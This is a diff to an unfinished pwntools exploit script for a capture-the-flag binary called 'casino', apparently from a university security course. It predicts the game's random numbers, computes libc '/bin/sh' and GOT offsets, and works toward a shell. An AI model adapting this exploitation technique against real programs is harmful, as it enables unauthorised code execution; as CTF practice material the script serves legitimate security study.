@@ -10,25 +10,33 @@ context.clear(arch='x86_64')
 name = '\x00' * 20
 
 # random number
-p = process('./gen_num.out')
-numbers = p.recvall().decode().split('\n')
+l = process('./gen_num.out')
+numbers = l.recvall().decode().split('\n')
 del numbers[-1]
-p.close()
+l.close()
 
 # calculate offset for system library
+elf = ELF('./casino')
 libc = ELF('libc-2.23.so')
-binsh_offset = next(libc.search('/bin/sh')) - libc.symbols['system']
+binsh_offset = next(libc.search('/bin/sh')) # - libc.symbols['system']
+
+got_read = elf.got['read']
+print('got_read', hex(got_read))
+got_read_chk = elf.got['__read_chk']
+print('got_read_chk', hex(got_read_chk))
 
 pop_call_offset = 0x107419
 
-system_base = 0x0
+main = 0x400564
+# p for payload
+# system_base = 0x0 ???? waiting for ret
+
+print(hex(binsh_offset))
 # send
 r = process("./casino")
 # r = remote('edu-ctf.csie.org', 10172)
 r.sendlineafter('name: ', name)
-pause()
-r.sendlineafter('age: ', age)
-pause()
+r.sendlineafter('age: ', '87')
 
 for cnt_try in range(0, 2):
     cnt_num = 0
@@ -43,6 +51,7 @@ for cnt_try in range(0, 2):
             r.sendlineafter(r_out, str(i))
             cnt_num += 1
     r.sendlineafter('0:no]:', '0')
+    pause()
 
 r.interactive()
 r.close()
